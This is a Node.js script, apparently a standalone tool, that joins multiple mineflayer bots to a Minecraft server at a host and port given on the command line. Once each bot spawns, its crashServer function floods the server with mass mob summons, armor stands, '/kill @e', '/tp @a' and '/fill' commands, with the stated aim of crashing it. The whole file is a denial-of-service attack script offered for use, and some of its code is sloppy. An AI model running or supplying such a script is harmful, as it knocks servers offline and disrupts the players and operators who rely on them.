const mineflayer = require('mineflayer');

async function joinServer(host, port, username) {
    const bot = mineflayer.createBot({
        host,
        port,
        username,
        // version: "1.21.1",
    });

    return new Promise((resolve, reject) => {

        delay = parseInt(process.argv[7]) || 10000;
        bot.once('spawn', () => {
            console.log(`Joined with ${username}`);
            resolve(bot);
            crashServer(bot, delay);
        });

        bot.once('kicked', (reason) => {
            reject(reason);
        });

        bot.once('error', (err) => {
            console.log(`Failed to join with username ${username}: ${err}`);
            reject(err);
        });
    });
}

async function main() {
    const host = process.argv[2] || 'localhost';
    const port = parseInt(process.argv[3]) || 25565;
    const usernamePrefix = process.argv[4] || 'BruteforceBot';
    const count = parseInt(process.argv[6]) || 5;
    const delay = parseInt(process.argv[7]) || 10000;

    const bots = [];

    for (let i = 0; i < count; i++) {
        const username = `${usernamePrefix}${i}`;
        try {
            const bot = await joinServer(host, port, username);
            bots.push(bot);
        } catch (err) {
            console.error(`Failed to join with username ${username}: ${err}`);
        }
        await new Promise(resolve => setTimeout(resolve, delay));
    }

    console.log(`Joined with ${bots.length} bots.`);
}

async function crashServer(bot, delay) {
    console.log('Attempting to crash the server...');

    // Summon lots of entities
    for (let i = 0; i < 100; i++) {
        bot.chat(`/summon wither ~ ~ ~`);
        await new Promise(resolve => setTimeout(resolve, delay / 5));
        bot.chat(`/summon ender_dragon ~ ~ ~`);
        await new Promise(resolve => setTimeout(resolve, delay / 5));
        bot.chat(`/summon warden ~ ~ ~`);
        await new Promise(resolve => setTimeout(resolve, delay / 5));
        bot.chat(`/summon elder_guardian ~ ~ ~`);
        await new Promise(resolve => setTimeout(resolve, delay / 5));
        bot.chat(i)
    }

    // Spawn lots of armor stands around the bot
    const radius = 10;
    const yLevel = bot.entity.position.y;
    for (let x = -radius; x <= radius; x++) {
        for (let z = -radius; z <= radius; z++) {
            const pos = bot.entity.position.offset(x, yLevel, z);
            bot.chat(`/summon armor_stand ${pos.x} ${pos.y} ${pos.z} {Marker:1}`);
        }
    }

    // Run lots of commands to overload the server
    for (let i = 0; i < 100; i++) {
        bot.chat(`/tp @a ~ ~ ~`);
        bot.chat(`/kill @e`);
        bot.chat(`/fill ~ ~ ~ ~ ~ ~ stone`);
    }

    console.log('Crash attempt finished.');
}

main();
